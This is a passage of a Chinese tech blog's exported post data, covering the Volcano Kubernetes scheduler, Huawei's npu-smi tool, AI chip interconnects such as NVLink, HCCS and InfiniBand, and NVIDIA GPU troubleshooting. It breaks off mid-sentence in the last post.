apiVersion: batch.volcano.sh/v1alpha1 kind: Job metadata: name: my-plugins-job spec: minAvailable: 3 plugins: ssh: [] env: [] svc: [] tasks: - replicas: 3 name: demo template: spec: containers: - name: demo image: shaowenchen/demo-sshd EOF 这样就创建了三个同时运行的 Pod。\n查看 Pod 的运行情况 1 2 3 4 5 6 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP my-plugins-job-demo-0 1/1 Running 0 79s 10.244.228.250 my-plugins-job-demo-1 1/1 Running 0 79s 10.244.8.240 my-plugins-job-demo-2 1/1 Running 0 79s 10.244.228.249 查看注入的环境变量 进入容器\n1 kubectl exec -it my-plugins-job-demo-0 -- bash 打印 Volcano 注入的环境变量\n1 2 3 4 5 6 env | grep -E \u0026#39;^VC_|^VK_\u0026#39; VC_DEMO_NUM=3 VK_TASK_INDEX=0 VC_TASK_INDEX=0 VC_DEMO_HOSTS=my-plugins-job-demo-0.my-plugins-job,my-plugins-job-demo-1.my-plugins-job,my-plugins-job-demo-2.my-plugins-job VC_DEMO_NUM 表示任务总数; VK_TASK_INDEX、VC_TASK_INDEX 从源码看赋值是相等的，均表示 Task 的索引号，在每个 Pod 中各不相同，VC_DEMO_HOSTS 表示当前任务的 IP 列表。\n测试 ssh 免密插件 进入容器\n1 kubectl exec -it my-plugins-job-demo-0 -- bash 免密 ssh 到其他 Pod\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ssh 10.244.8.240 Warning: Permanently added \u0026#39;10.244.8.240\u0026#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-144-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. 需要注意，这里只能通过 IP 访问，不能使用 Pod Name，因为 Volcano 并没有将其他 Pod 的 IP 和 Name 写入到 /etc/hosts 中。\n5. 配置 Deployment 使用 Volcano 控制资源使用 这里举一个示例，限制 Deployment 最多仅能使用 2 核 CPU。\n创建队列 1 2 3 4 5 6 7 8 9 10 11 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: scheduling.volcano.sh/v1beta1 kind: Queue metadata: name: my-node-queue spec: weight: 1 reclaimable: false capability: cpu: 2 EOF 创建一个仅有 2 核 CPU、并且绑定到节点组 my-node-group 的队列。\n这里的 weight 表示集群资源划分中所占的相对比重，是软约束; reclaimable 表示是否允许被回收，由 weight 来决定; capability 表示队列的资源限制。\n创建 Deployment 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: ubuntu-with-volcano labels: app: demo spec: replicas: 1 selector: matchLabels: app: demo template: metadata: labels: app: demo spec: schedulerName: volcano containers: - name: demo image: shaowenchen/demo-ubuntu resources: requests: cpu: 1 EOF 将 schedulerName 设置为 volcano，表示使用 Volcano 调度器。\n查看 Pod 1 2 3 4 kubectl get pods -l app=demo NAME READY STATUS RESTARTS AGE ubuntu-with-volcano-97c94f9fb-bfgrh 1/1 Running 0 6m24s 扩容 Deployment 1 kubectl scale deployment/ubuntu-with-volcano --replicas=3 此时，三个 Pod 只有两个处于 Running 状态，因为 Volcano 限制了 Deployment 最多仅能使用 2c CPU。\n1 2 3 4 5 6 kubectl get pods -l app=demo NAME READY STATUS RESTARTS AGE ubuntu-with-volcano-97c94f9fb-25nb7 1/1 Running 0 27s ubuntu-with-volcano-97c94f9fb-6fd64 0/1 Pending 0 27s ubuntu-with-volcano-97c94f9fb-bfgrh 1/1 Running 0 7m31s 6. 配置 Job 使用 Volcano 限流并发执行 这里创建一个 Job 并且要求至少 3 个 Pod 一起运行的 Job。\n直接使用 Kubernetes batch/v1 中的 Job ，配置 completions 和 parallelism，也可以实现这个需求。但 Volcano 提供的 Queue 可以控制资源使用、Policy 可以控制 Task 的生命周期策略，能更精准控制 Job 的执行。\n创建 Job 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch.volcano.sh/v1alpha1 kind: Job metadata: name: my-job spec: minAvailable: 3 schedulerName: volcano queue: default policies: - event: PodEvicted action: RestartJob tasks: - replicas: 30 name: demo policies: - event: TaskCompleted action: CompleteJob template: spec: containers: - image: ubuntu name: demo command: [\u0026#34;sleep\u0026#34;, \u0026#34;5\u0026#34;] resources: requests: cpu: 20 restartPolicy: Never EOF 其中:\n1 2 3 policies: - event: PodEvicted action: RestartJob 表示如果 Pod 被 Evict 了，就重启 Job。\n1 2 3 policies: - event: TaskCompleted action: CompleteJob 表示如果 Task 完成了，就完成 Job。\n通过 Event 和 Action，可以控制 Job 的状态和行为。\n查看 Pod 创建情况 1 2 3 4 5 6 7 8 9 kubectl get pod NAME READY STATUS RESTARTS AGE my-job-demo-0 1/1 Running 0 7s my-job-demo-1 1/1 Running 0 7s my-job-demo-10 0/1 Pending 0 7s ... my-job-demo-2 1/1 Running 0 7s ... 由于我设置了 Pod 的 CPU Request 为 20，集群上没有足够的资源，所以 30 个 Pod 每次只能运行 3 个。\n执行完成之后，Pod 不会被删除而是处于 Completed 状态。由于 Pod 的 ownerReferences 是 Job，如果删除 Job，Pod 也会被删除。\n","description":"","id":61,"section":"post","tags":["博文","Volcano","AI","Kubernetes","调度"],"title":"Volcano 使用基础","uri":"https://www.chenshaowen.com/blog/the-basic-of-volcano.html"},{"content":"1. 什么是 npu-smi npu-smi 是华为提供的一个命令行工具，专门用于管理和监控华为昇腾（Ascend）系列神经网络处理器（NPU）的状态和性能，似于 NVIDIA 的 nvidia-smi。\n2. npu-smi 字段含义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 npu-smi info +------------------------------------------------------------------------------------------------+ | npu-smi 23.0.2.1 Version: 23.0.2.1 | +---------------------------+---------------+----------------------------------------------------+ | NPU Name | Health | Power(W) Temp(C) Hugepages-Usage(page)| | Chip | Bus-Id | AICore(%) Memory-Usage(MB) HBM-Usage(MB) | +===========================+===============+====================================================+ | 0 910B2C | OK | 88.6 51 0 / 0 | | 0 | 0000:5A:00.0 | 0 0 / 0 20701/ 65536 | +===========================+===============+====================================================+ | 1 910B2C | OK | 99.6 50 0 / 0 | | 0 | 0000:19:00.0 | 0 0 / 0 20687/ 65536 | +===========================+===============+====================================================+ ... +===========================+===============+====================================================+ | 15 910B2C | OK | 110.4 51 0 / 0 | | 0 | 0000:C9:00.0 | 0 0 / 0 11684/ 65536 | +===========================+===============+====================================================+ +---------------------------+---------------+----------------------------------------------------+ | NPU Chip | Process id | Process name | Process memory(MB) | +===========================+===============+====================================================+ | 0 0 | 124528 | python3.8 | 17400 | 字段 说明 npu-sml npu-sml 工具版本 Version 驱动版本 NPU 设备 id Name 芯片名称 Health 芯片的健康状态, 有如下五种状态: OK、Warning、Alarm、Critical 和 UNKNOWN Power(W) 芯片功率 (单位 W) Temp(C) 芯片温度 (单位 ℃) Hugepages-Usage(page) 大页占比 (单位 page)，每一个 page 的大小是 2048KB。 Chip 芯片 id Device 芯片操号 Bus-Id BUS ID AICore(%) AICore 占用率 Memory-Usage(MB) 内存占比 3. npu-smi info 使用 3.1 参数格式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 npu-smi info --help Usage: npu-smi info \u0026lt;watch|proc|-h|-m|-l|-t type\u0026gt; [Options...] Commands: watch Show all device\u0026#39;s status in scrolling format proc Show device\u0026#39;s matrix process status in scrolling format -h, --help Show this help text and exit -m Show all device\u0026#39;s mapping information -l Show all device\u0026#39;s topology information -t type Show information for type type: board, flash, memory, usages, sensors, temp, power, volt, mac-addr, common, health, product, ecc, ip, sys-time, i2c_check, work-mode, ecc-enable, p2p-enable, ssh-enable, license, customized-info, device-share, nve-level, aicpu-config, pcie-err, mcu-monitor, err-count, boot-area, vnpu-mode, info-vnpu, vnpu-svm, cpu-num-cfg, first-power-on-date, proc-mem, phyid-remap, vnpu-cfg-recover, key-manage, template-info, pkcs-enable, p2p-mem-cfg, pwm-mode, pwm-duty-ratio, boot-select, topo. Options: -i %d Card ID -c %d Chip ID -p %d Chip Physical ID 通过 -t 指定查询类型，-i 指定设备 ID，相关的查询类型有(不同设备支持的类型有差异):\n查询类型 含义 board 板卡信息 flash 闪存信息 memory 内存信息 usages 资源使用情况 sensors 传感器信息 temp 温度信息 power 功率信息 volt 电压信息 mac-addr MAC 地址信息 common 通用信息 health 健康状态 product 产品信息 ecc 纠错码（ECC）信息 ip IP 地址信息 sys-time 系统时间信息 i2c_check I2C 检查信息 work-mode 工作模式 ecc-enable 纠错码（ECC）启用状态 p2p-enable 点对点（P2P）通信启用状态 ssh-enable SSH 启用状态 license 许可证信息 customized-info 定制信息 device-share 设备共享信息 nve-level NVE 级别信息 aicpu-config AI CPU 配置信息 pcie-err PCIe 错误信息 mcu-monitor MCU 监控信息 err-count 错误计数信息 boot-area 启动区域信息 vnpu-mode vNPU 模式信息 info-vnpu vNPU 信息 vnpu-svm vNPU 虚拟化信息 cpu-num-cfg CPU 核心配置信息 first-power-on-date 首次上电日期信息 proc-mem 进程内存信息 phyid-remap 物理 ID 重映射信息 vnpu-cfg-recover vNPU 配置恢复信息 key-manage 密钥管理信息 template-info 模板信息 pkcs-enable PKCS 启用状态 p2p-mem-cfg P2P 内存配置信息 pwm-mode PWM 模式信息 pwm-duty-ratio PWM 占空比信息 boot-select 启动选择信息 topo 拓扑结构信息 3.2 常用 info 参数命令 查询设备板卡详情 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 npu-smi info -t board -i 0 NPU ID : 0 Product Name : IT21HMDB01-B2 Model : NA Manufacturer : Huawei Serial Number : 1023A6017006 Software Version : 23.0.2.1 Firmware Version : 7.1.0.4.220 Compatibility : OK Board ID : 0x65 PCB ID : A BOM ID : 1 PCIe Bus Info : 0000:5A:00.0 Slot ID : 0 Class ID : NA PCI Vendor ID : 0x19E5 PCI Device ID : 0xD802 Subsystem Vendor ID : 0x19E5 Subsystem Device ID : 0x3400 Chip Count : 1 查询设备的芯片详情 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 npu-smi info -t board -i 0 -c 0 NPU ID : 0 Chip ID : 0 Chip Type : Ascend Chip Name : 910B2C Chip Version : V1 Board ID : 0x51 PCB ID : NA BOM ID : 1 VDie ID : DE36A664 01202745 59C48932 98500485 100301E3 NDie ID : 00000000 00000000 00000000 00000000 00000000 Chip Position ID : 0 PCIe Bus Info : 0000:5A:00.0 Firmware Version : 7.1.0.4.220 查看连接拓扑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 npu-smi info -t topo NPU0 NPU1 NPU2 NPU3 NPU4 NPU5 NPU6 NPU7 NPU8 NPU9 NPU10 NPU11 NPU12 NPU13 NPU14 NPU15 CPU Affinity NPU0 X HCCS HCCS HCCS HCCS HCCS HCCS HCCS PIX PHB PHB PHB SYS SYS SYS SYS 0-43,88-131 NPU1 HCCS X HCCS HCCS HCCS HCCS HCCS HCCS PHB PIX PHB PHB SYS SYS SYS SYS 0-43,88-131 ... NPU15 SYS SYS SYS SYS PHB PHB PHB PIX HCCS HCCS HCCS HCCS HCCS HCCS HCCS X 44-87,132-175 Legend: X = Self SYS = Path traversing PCIe and NUMA nodes. Nodes are connected through SMP, such as QPI, UPI. PHB = Path traversing PCIe and the PCIe host bridge of a CPU. PIX = Path traversing a single PCIe switch PXB = Path traversing multipul PCIe switches HCCS = Connection traversing HCCS. NA = Unknown relationship. 查询芯片监控数据 1 2 3 4 5 6 npu-smi info watch 0 0 313.3 64 17 2 1 86 31 1 0 283.4 65 46 2 4 85 32 ... 15 0 319.0 65 3 2 1 85 29 查询设备常用信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 npu-smi info -t common -i 0 NPU ID : 0 Chip Count : 1 Chip ID : 0 Memory Usage Rate(%) : 0 HBM Usage Rate(%) : 86 Aicore Usage Rate(%) : 66 Aicore Freq(MHZ) : 1800 Aicore curFreq(MHZ) : 1800 Aicore Count : 24 Temperature(C) : 67 NPU Real-time Power(W) : 296.5 Chip Name : mcu Temperature(C) : 56 4. npu-smi set 使用 4.1 参数格式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 npu-smi set --help Usage: npu-smi set \u0026lt;-h|-t type\u0026gt; [Options...] Commands: -h, --help Show this help text and exit -t type The set type for device type: ecc-enable, collect-log, reset, device-share, nve-level, clear-ecc-info, license, ssh-enable, customized-info, clear-pcie-err, revocate, mac-addr, mcu-monitor, boot-area, aicpu-config, disk-power, ip, errcount-clear, vnpu-mode, create-vnpu, destroy-vnpu, vnpu-svm, cpu-num-cfg, vnpu-cfg-recover, key-manage, pkcs-enable, p2p-mem-cfg, pwm-mode, pwm-duty-ratio, power-state, boot-select, reset-vnpu. Options: -i %d Card ID -c %d Chip ID -d %d Config value -s String format configuration -f License (1-255) or path of SoC certificate files -m By in-band reset, only can input 1 通过 -t 指定配置类型，-i 指定设备 ID。这里不同于 npu-smi info 的是使用 -d 指定配置值，相关的配置类型有(不同设备支持的类型有差异):\n类型 含义 ecc-enable 启用 ECC 纠错 collect-log 收集日志 reset 重置设备 device-share 设备共享 nve-level NVE 级别设置 clear-ecc-info 清除 ECC 信息 license 许可证管理 ssh-enable 启用 SSH customized-info 自定义信息设置 clear-pcie-err 清除 PCIe 错误 revocate 撤销操作 mac-addr MAC 地址设置 mcu-monitor MCU 监控设置 boot-area 启动区域设置 aicpu-config AI CPU 配置 disk-power 磁盘功率设置 ip IP 地址设置 errcount-clear 清除错误计数 vnpu-mode vNPU 模式设置 create-vnpu 创建 vNPU destroy-vnpu 销毁 vNPU vnpu-svm vNPU 虚拟化设置 cpu-num-cfg CPU 核心数配置 vnpu-cfg-recover vNPU 配置恢复 key-manage 密钥管理 pkcs-enable PKCS 启用 p2p-mem-cfg P2P 内存配置 pwm-mode PWM 模式设置 pwm-duty-ratio PWM 占空比设置 power-state 电源状态设置 boot-select 启动选择设置 reset-vnpu 重置 vNPU 4.2 常用 set 参数命令 收集日志 1 npu-smi set -t collect-log -i 0 等待收集完成之后，在 /run/mcu_log 目录下可以找到日志文件，系统不会自动清理这些日志，需要自行清理。\n配置 ECC 使能状态 使能\n1 npu-smi set -t ecc-enable -i id -d 1 禁用\n1 npu-smi set -t ecc-enable -i id -d 0 设置指定芯片的算力等级 1 npu-smi set -t nve-level -i id -d 1 算力等级分为四等:\n0 - Low\n1 - Middle\n2 - High\n3 - Full\n","description":"","id":62,"section":"post","tags":["博文","AI","NPU","Huawei","硬件"],"title":"npu-smi 基本使用","uri":"https://www.chenshaowen.com/blog/basic-usage-of-npu-smi.html"},{"content":" 最近在研习模型训练相关的基础设施，发现 AI 芯片互连拓扑决定着训练集群任务的调度和资源分配，因此花了一点时间整理了一下常见的 AI 芯片互连方案。\n1. 点对点互连 传统的 PCIe 系统下， AI 芯片与 AI 芯片之间的数据传输是通过 PCIe 传输，无法满足大规模数据传输的要求。\n1.1 NVLink NVLink 是同主机内不同 GPU 之间的一种高速互联方式。\nNVLink 随着 GPU 架构的演进不断发展，从 P100 的 NVLink1 到 H100 的 NVLink4。如图所示是 NVLink 1.0、NVLink 2.0、NVLink 3.0 和 NVLink 4.0 之间的区别，关键在于连接方式、带宽和性能。\n产品 发布时间 显卡 连接数量 GPU 之间总带宽 应用架构 NV Link 1.0 2016 P100 4 160 GB/s Pascal NV Link 2.0 2017 V100 6 300 GB/s Volta NV Link 3.0 2020 A100 12 600 GB/s Ampere NV Link 4.0 2022 H100 18 900 GB/s Hopper NV Link 5.0 预计 2025 B200 18 1800 GB/s Blackwell 需要注意的是，使用 NVLink 之前需要先安装 nvidia-fabricmanager 服务。\n为了有一个直观的印象，我们看看机箱中怎么安装 NVLink\n打开 NVLink 盖 调整 NVLink 桥接器的方向，进行安装 1.2 HCCS HCCS（High-speed Custom Communication System）是华为为其昇腾（Ascend）系列 AI 处理器设计的高速互连技术。\n如上图，满配的 Atlas 800 训练服务器包含两块 910 板，每个板上都有 4 个 910 NPU。这些 NPU 之间的连接方式是 HCCS，图中 910 之间的蓝色线，而不同的 NPU 之间的连接方式是 PCIe。\n而我接触到的 910B 服务器，也有两块 910B 板，每个板上都有 8 个 910B NPU，下面看看他们的拓扑:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 npu-smi info -t topo NPU0 NPU1 NPU2 NPU3 NPU4 NPU5 NPU6 NPU7 NPU8 NPU9 NPU10 NPU11 NPU12 NPU13 NPU14 NPU15 CPU Affinity NPU0 X HCCS HCCS HCCS HCCS HCCS HCCS HCCS PIX PHB PHB PHB SYS SYS SYS SYS 0-43,88-131 NPU1 HCCS X HCCS HCCS HCCS HCCS HCCS HCCS PHB PIX PHB PHB SYS SYS SYS SYS 0-43,88-131 NPU2 HCCS HCCS X HCCS HCCS HCCS HCCS HCCS PHB PHB PIX PHB SYS SYS SYS SYS 0-43,88-131 NPU3 HCCS HCCS HCCS X HCCS HCCS HCCS HCCS PHB PHB PHB PIX SYS SYS SYS SYS 0-43,88-131 NPU4 HCCS HCCS HCCS HCCS X HCCS HCCS HCCS SYS SYS SYS SYS PIX PHB PHB PHB 44-87,132-175 NPU5 HCCS HCCS HCCS HCCS HCCS X HCCS HCCS SYS SYS SYS SYS PHB PIX PHB PHB 44-87,132-175 NPU6 HCCS HCCS HCCS HCCS HCCS HCCS X HCCS SYS SYS SYS SYS PHB PHB PIX PHB 44-87,132-175 NPU7 HCCS HCCS HCCS HCCS HCCS HCCS HCCS X SYS SYS SYS SYS PHB PHB PHB PIX 44-87,132-175 NPU8 PIX PHB PHB PHB SYS SYS SYS SYS X HCCS HCCS HCCS HCCS HCCS HCCS HCCS 0-43,88-131 NPU9 PHB PIX PHB PHB SYS SYS SYS SYS HCCS X HCCS HCCS HCCS HCCS HCCS HCCS 0-43,88-131 NPU10 PHB PHB PIX PHB SYS SYS SYS SYS HCCS HCCS X HCCS HCCS HCCS HCCS HCCS 0-43,88-131 NPU11 PHB PHB PHB PIX SYS SYS SYS SYS HCCS HCCS HCCS X HCCS HCCS HCCS HCCS 0-43,88-131 NPU12 SYS SYS SYS SYS PIX PHB PHB PHB HCCS HCCS HCCS HCCS X HCCS HCCS HCCS 44-87,132-175 NPU13 SYS SYS SYS SYS PHB PIX PHB PHB HCCS HCCS HCCS HCCS HCCS X HCCS HCCS 44-87,132-175 NPU14 SYS SYS SYS SYS PHB PHB PIX PHB HCCS HCCS HCCS HCCS HCCS HCCS X HCCS 44-87,132-175 NPU15 SYS SYS SYS SYS PHB PHB PHB PIX HCCS HCCS HCCS HCCS HCCS HCCS HCCS X 44-87,132-175 Legend: X = Self SYS = Path traversing PCIe and NUMA nodes. Nodes are connected through SMP, such as QPI, UPI. PHB = Path traversing PCIe and the PCIe host bridge of a CPU. PIX = Path traversing a single PCIe switch PXB = Path traversing multipul PCIe switches HCCS = Connection traversing HCCS. NA = Unknown relationship. 编号 0 到 7 之间的 NPU 两两通过 HCSS 互连，而编号 8 到 15 之间的 NPU 两两通过 HCCS 互连。我们在训练模型时，应该要尽量使同一个任务的 Pod 运行在同一块板子上。\n而每块板上互连的 8 个 NPU 总的 HCSS 带宽是 392 GB/s，这意味着同一块板子上两个 NPU 之间的带宽是 392/7 = 56 GB/s。\n2. 多点组网 2.1 NVSwitch NVSwitch 是 NVIDIA 的一款交换芯片，用来连接同一台主机内的 GPU，是一种基于 NVLink 技术的扩展。\n产品 直连或节点中 GPU 数上限 GPU 间带宽 应用架构 NV Switch 1.0 8 300 GB/s Volta NV Switch 2.0 8 600 GB/s Ampere NV Switch 3.0 8 900 GB/s Hopper 在网上没有找到具体的安装说明，上图 6 个散热器下面压着的就是 NVSwitch 芯片。安装好 NVSwitch 之后，使用 NVLink 线缆，将 NVSwitch 与 GPU 卡连接。\n使用 NVSwitch 也需要安装 nvidia-fabricmanager 服务。\n3. 跨节点互连 3.1 NVLink 交换机 2022 年，NVIDIA 将 NVSwitch 芯片独立出来，并制作成 NVLink 交换机，用于连接主机之间的 GPU 设备。\nNVSwitch 物理交换机将多个 NVLink GPU 服务器连接成一个大型 Fabric 网络，即 NVLink 网络，解决了 GPU 之间的高速通信带宽和效率问题。每个服务器都有独立的地址空间，为 NVLink 网络中的 GPU 提供数据传输、隔离和安全保护。\n3.2 InfiniBand 网络 InfiniBand 来自一家以色列公司 Mellanox，2020 年 NVIDIA 以 69 亿美元的价格收购了这家公司。\nInfiniBand 是一种专为高性能计算和数据中心设计的网络，它提供了高带宽和低延迟的通信能力。InfiniBand 交换机通常用于构建高性能计算集群，支持拥塞控制、虚拟通道和多路径传输等特性。\nInfiniBand 网络的设备成本较高，但提供了极致的性能。\nInfiniBand 是一种基于通道的结构，组成单元主要分为四类：\nHCA（Host Channel Adapter，主机通道适配器） TCA（Target Channel Adapter，目标通道适配器） InfiniBand link（连接通道，可以是电缆或光纤，也可以是板上链路） InfiniBand 交换机和路由器（组网用的） 组建一个 InfiniBand 网络主要需要四个物理组件:\nAdapter 适配器，用于将服务器连接到 InfiniBand 网络。 DPU 数据处理单元，用于处理数据，释放 CPU 压力 Switch 交换机，用于连接多个设备 Cable 线缆，用于连接 Adapter、DPU 和 Switch。 一根 InfiniBand 线缆的价格就上万，如果构建大规模集群，还需要部署 Spine-Leaf 网络，因此构建一个大规模 InfiniBand 网络的成本就会很高。\nInfiniBand 网络普遍被超级计算机方案所使用，广泛用于数据中心和高性能计算集群中。InfiniBand 的带宽随着技术的发展而不断提升，从早期的 SDR（1 Gbps）、DDR（2 Gbps）、QDR（4 Gbps）、FDR（8 Gbps）、EDR（16 Gbps）、HDR（32 Gbps），发展到 NDR（100 Gbps）、XDR（200 Gbps）、GDR（400 Gbps）。\n3.3 RoCE 网络 RoCE 是 RDMA over Ethernet，是一种基于以太网的 RDMA（Remote Direct Memory Access）技术。它允许在网络上进行直接内存访问，从而减少 CPU 负载并提高数据传输效率。\nRoCE 有两个版本：RoCE v1 和 RoCE v2。RoCE v1 主要在以太网链路层实现 RDMA，而 RoCE v2 在以太网 TCP/IP 协议的 UDP 层实现，并引入 IP 来解决扩展性问题。\n相较于昂贵的 InfiniBand 组件的 RDMA 通道，RoCE 则便宜了许多。\n但这种便宜也只限于硬件成本，RoCE 的人力成本显著高于 InfiniBand，需要网络专家才能玩得转，用来解决网卡、交换机上的各种奇奇怪怪问题。\n除非超大规模集群建设需要，有上万节点，有足够的的资金投入建设，否则建议选择几乎免运维的 InfiniBand 网络。\n组建一个 RoCEv2 可选的设备就很多，并且相较于 InfiniBand 网络的设备，价格也显著便宜，只需要支持 RoCEv2 协议的设备即可。\n另外，InfiniBand 网卡支持两种模式: InfiniBand 和 RoCE。InfiniBand 网卡能直接当做 RoCEv2 的 NIC 用。\nRoCE 的带宽取决于所使用的以太网标准。RoCE v1 通常运行在 10 Gbps 或 40 Gbps 的以太网网络上，而 RoCE v2 可以在更高速度的网络上运行，如 25 Gbps、40 Gbps、50 Gbps 甚至 100 Gbps\n3.4 Spine-Leaf 网络 在机房中，经常也会采用 Spine-Leaf 网络，配合 InfiniBand 网卡来构建高性能计算集群。\nSpine 层是网络的骨干; Leaf 层用来连接服务器、存储设备等终端设备。通常 Spine 层和 Leaf 层都会使用三层交换机来构建。\nSpine-Leaf 网络架构可以提供高带宽、低延时、非阻塞的服务器到服务器连接。Spine-Leaf 网络的优点包括:\n易于横向扩展。在不需要改变网络拓扑结构的情况下，可以横向扩展网络，增加 Spine、Leaf 节点以扩大网络规模。 无阻塞设计。每个 Leaf 都与每一个 Spine 交换机相连，保障了任意两个节点之间的通信不会受到其他流量影响。 网络跳数少。任意两个端点之间最多经过三跳可达，Leaf - Spine - Leaf。 网络结构简单，仅有两个层级，易于管理和维护。 典型数据传输过程:\n同一个 Leaf 节点下的服务器。同一个 Leaf 节点之间需要通信时，数据直接通过该 Leaf 节点进行转发，无需经过 Spine 节点。\n跨两个 Leaf 节点下的服务器。数据从源服务器通过 Leaf 交换机发送到 Spine 交换机，然后通过 Spine 交换机转发到目标节点所在的 Leaf 节点，再通过 Leaf 节点转发到目标服务器。\nSpine-Leaf 网络中服务器与服务器之间最大带宽取决于以下因素：\n服务器网卡带宽 Leaf 交换机端口带宽和背板带宽 Spine 交换机端口带宽和背板带宽 Spine-Leaf 之间连接带宽 如果使用以太网，Spine-Leaf 网络的带宽取决于以太网标准；如果使用 InfiniBand 网络，Spine-Leaf 网络的带宽取决于 InfiniBand 网络的带宽。\n4. 参考 https://www.nvidia.cn/data-center/nvlink/ https://community.fs.com/cn/article/an-overview-of-nvidia-nvlink.html ","description":"","id":63,"section":"post","tags":["博文","AI","芯片","互连"],"title":"AI 芯片高速互连方案","uri":"https://www.chenshaowen.com/blog/ai-chip-high-speed-connection-solution.html"},{"content":" 处理故障时，参考或者记录下的内容，持续更新中\n1. XID 错误事件 XID 是 NVIDIA 的错误码，可以通过命令:\n1 dmesg -T | grep -i \u0026#34;NVRM: Xid\u0026#34; 或者\n1 journalctl --since `date -d \u0026#34;10 days ago\u0026#34; \u0026#34;+%Y-%m-%d\u0026#34;`|grep Xid 根据 XID 可以定位故障，下面是一些常见的 XID 事件\nXID 说明 13 Graphics Engine Exception。通常是数组越界、指令错误,小概率是硬件问题。 31 GPU memory page fault。通常是应用程序的非法地址访问,极小概率是驱动或者硬件问题。 43 GPU stopped processing。通常是用户应用自身错误而非硬件问题。 45 Preemptive cleanup, due to previous errors \u0026ndash; Most likely to see when running multiple cuda applications and hitting a DBE。通常是用户手动退出或者其他故障(硬件、资源限制等)导致 GPU 应用退出,Xid 45 只是一个结果,通常需要分析日志。 68 NVDEC0 Exception。通常是硬件或驱动问题。 32 Invalid or corrupted push buffer stream。事件由 PCIE 总线上管理 NVIDIA 驱动和 GPU 之间通信的 DMA 控制器上报,通常是 PCI 质量问题导致,而非用户程序产生。 38 Driver firmware error。通常是驱动固件错误而非硬件问题。 48 Double Bit ECC Error(DBE)。当 GPU 发生不可纠正的错误时,会上报 Xid48 事件。该错误也会同时反馈给用户的应用程序。通常需要重置 GPU 或重启节点来清除这个错误。 61 Internal micro-controller breakpoint/warning。GPU 内部引擎停止工作,客户业务已经受到影响。 62 Internal micro-controller halt。与 Xid61 的触发场景类似。 63 ECC page retirement or row remapping recording event。当应用程序遭遇到 GPU 显存硬件错误时,NVIDIA 自纠错机制会将错误的内存区域 retire 或者 remap,retirement 和 remapped 信息需要记录到 infoROM 中才能永久生效。Volt 架构:记录 ECC page retirement 事件到 infoROM 成功。Ampere 架构:记录 row remapping 事件到 infoROM 成功 64 ECC page retirement or row remapper recording failure。与 Xid63 的触发场景类似,只是 Xid63 代表 retirement 和 remapped 信息成功记录到了 infoROM,Xid64 代表该记录操作失败。 74 NVLINK Error。NVLink 硬件错误产生的 Xid,收到此事件说明 GPU 已经出现严重硬件故障,需要下线维修。 79 GPU has fallen off the bus。GPU 硬件检测到掉卡,无法从总线上检测到,收到此事件说明 GPU 已经出现严重硬件故障,需要下线维修。 92 High single-bit ECC error rate。硬件或驱动故障。 94 Contained ECC error。当应用程序遭遇到 GPU 不可纠正的显存 ECC 错误时,NVIDIA 错误抑制机制会尝试将错误抑制在踩到硬件故障的应用程序,而不会让错误导致 GPU 上的所有应用程序受到影响。当抑制机制成功抑制错误时,会产生 Xid 94 事件,仅影响遭遇了不可纠正 ECC 错误的应用程序。 95 Uncontained ECC error。与 Xid94 的触发场景类似。只是 Xid94 代表抑制成功,而 Xid95 代表抑制失败,此时表明运行在该 GPU 上的所有应用程序都已受到影响。 详情参考 https://docs.nvidia.com/deploy/xid-errors/index.html\n2. GPU 过高 通常 GPU 温度应该在 85°C 以下，超过时会出现锁频性能下降的问题。执行以下命令，能直接看到 GPU 编号及温度。\n1 2 3 4 5 6 7 8 9 10 nvidia-smi --query-gpu=index,temperature.gpu --format=csv,noheader 0, 28 1, 40 2, 44 3, 30 4, 27 5, 27 6, 31 7, 32 解决方案:\n除了一些物理的方法，从纯软件层考虑，可以直接将温度超过阈值的 GPU 上面的应用程序杀掉，使其更换到其他的 GPU 上。\n3. 重启掉卡，nvswitch 报错 1 systemctl status nvidia-fabricmanager.service 或者\n1 less /var/log/fabricmanager.log | grep error 看到有 NVlink、NVSwitch 报错。\n或者 nvidia-smi 找不到 device handle，Unknown Error 错误。\n或者重启之后少卡。\n解决方案:\n启用 nvidia-persistenced 持久模式，让驱动程序保持加载状态，可以很大幅度的缓解这个问题。\n4. Pod 中 nvidia-smi 报错 Function not Found 在 Pod 中执行命令报错:\n1 2 3 4 5 6 7 8 9 10 11 12 13 nvidia-smi +---------------------------------------------------------------------------------------+ | NVIDIA-SMI 535.129.03 Driver Version: 535.129.03 CUDA Version: 12.2 | |-----------------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |=========================================+======================+======================| | 0 NVIDIA TITAN X (Pascal) On | 00000000:03:00.0 Off | N/A | | 23% 26C P8 8W / 250W | Function Not Found | 0% Default | | | | N/A | +-----------------------------------------+----------------------+----------------------+ 因为 Pod 中的 cuda 版本过低，与节点上的 cuda 